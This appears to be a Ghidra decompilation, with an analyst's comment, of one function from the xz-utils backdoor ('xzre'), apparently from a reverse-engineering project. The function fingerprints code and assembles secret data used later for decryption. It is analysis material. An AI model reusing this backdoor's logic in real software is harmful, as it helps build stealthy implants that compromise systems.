// /home/kali/xzre-ghidra/xzregh/10AAC0_secret_data_append_singleton.c
// Function: secret_data_append_singleton @ 0x10AAC0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall secret_data_append_singleton(u8 * call_site, u8 * code, secret_data_shift_cursor_t shift_cursor, uint shift_count, uint operation_index)
/*
 * AutoDoc: Performs a one-off fingerprint of a function: finds its start, validates the instruction stream, shifts the requested number of bits, and marks the operation id as complete. Setup routines call it to attest critical helpers before relying on them for decryption.
 */

#include "xzre_types.h"


BOOL secret_data_append_singleton
               (u8 *call_site,u8 *code,secret_data_shift_cursor_t shift_cursor,uint shift_count,
               uint operation_index)

{
  long lVar1;
  BOOL BVar2;
  void *local_30 [2];
  
  lVar1 = global_ctx;
  local_30[0] = (void *)0x0;
  if ((global_ctx == 0) || (*(char *)(global_ctx + 0x141 + (ulong)operation_index) != '\0')) {
LAB_0010ab60:
    BVar2 = 1;
  }
  else {
    *(undefined1 *)(global_ctx + 0x141 + (ulong)operation_index) = 1;
    BVar2 = find_function(code,local_30,(void **)0x0,*(u8 **)(lVar1 + 0x80),*(u8 **)(lVar1 + 0x88),
                          FIND_NOP);
    if (BVar2 != 0) {
      BVar2 = secret_data_append_from_code
                        (local_30[0],*(void **)(global_ctx + 0x88),shift_cursor,shift_count,
                         (uint)(call_site == (u8 *)0x0));
      if (BVar2 != 0) {
        *(int *)(global_ctx + 0x160) = *(int *)(global_ctx + 0x160) + shift_count;
        goto LAB_0010ab60;
      }
    }
    BVar2 = 0;
  }
  return BVar2;
}

